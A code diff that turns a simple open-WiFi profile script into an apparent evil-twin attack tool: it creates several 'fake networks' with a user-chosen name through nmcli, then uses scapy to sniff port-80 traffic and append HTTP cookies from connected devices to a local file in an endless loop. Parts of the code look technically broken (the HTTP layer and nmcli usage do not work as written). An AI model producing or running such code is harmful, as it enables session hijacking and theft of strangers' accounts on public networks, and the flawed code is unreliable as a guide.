@@ -1,21 +1,37 @@
-import pywifi
-from pywifi import const
+import os
+import subprocess
+from scapy.all import *
+import time
 
-def create_multiple_open_wifi_networks(ssid, num_networks):
-    wifi = pywifi.PyWiFi()
-    iface = wifi.interfaces()[0]
-    iface.disconnect()
-    iface.remove_all_network_profiles()
-
+def create_fake_networks(network_name, num_networks):
     for i in range(num_networks):
-        profile = pywifi.Profile()
-        profile.ssid = ssid
-        profile.auth = const.AUTH_OPEN
+        subprocess.run(['nmcli', 'dev', 'wifi', 'rescan'])
+        subprocess.run(['nmcli', 'dev', 'wifi', 'list'])
+        subprocess.run(['nmcli', 'dev', 'wifi', 'connect', network_name, 'password', ''])
+        subprocess.run(['nmcli', 'connection', 'modify', network_name, 'ipv4.method', 'shared'])
 
-        iface.connect(iface.add_network_profile(profile))
-        print(f"Successfully created open WiFi network {i+1} with SSID: {ssid}")
+def intercept_cookies():
+    def packet_handler(packet):
+        if packet.haslayer(HTTP):
+            cookies = packet[HTTP].Cookie
+            with open('intercepted_cookies.txt', 'a') as file:
+                file.write(cookies + '\n')
 
-if __name__ == "__main__":
-    ssid = input("Enter the desired SSID for the WiFi networks: ")
-    num_networks = int(input("Enter the number of WiFi networks to create: "))
-    create_multiple_open_wifi_networks(ssid, num_networks)
+    # Continuously sniff packets and intercept HTTP cookies
+    while True:
+        sniff(filter='tcp port 80', prn=packet_handler, store=0)
+        time.sleep(1)
+
+# Step 1: Show available WiFi networks
+subprocess.run(['nmcli', 'dev', 'wifi', 'rescan'])
+subprocess.run(['nmcli', 'dev', 'wifi', 'list'])
+
+# Step 2: Prompt the user to choose a network name
+network_name = input("Enter the desired network name: ")
+
+# Step 3: Create multiple fake networks with the chosen name
+num_networks = int(input("Enter the number of fake networks to create: "))
+create_fake_networks(network_name, num_networks)
+
+# Step 4: Continuously intercept HTTP cookies from connected devices
+intercept_cookies()
